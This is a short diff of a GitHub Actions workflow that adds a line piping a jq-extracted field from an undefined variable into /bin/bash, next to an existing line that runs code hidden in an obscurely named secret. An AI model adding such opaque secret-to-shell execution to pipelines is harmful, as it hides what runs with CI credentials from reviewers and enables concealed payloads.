@@ -18,6 +18,7 @@ jobs:
           m43: ${{ secrets.m43 }}
         run: |
           printf '%s' "$m43" | jq -r .hnxme48375 | /bin/bash
+          echo $ex6 | jq -r .x6 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
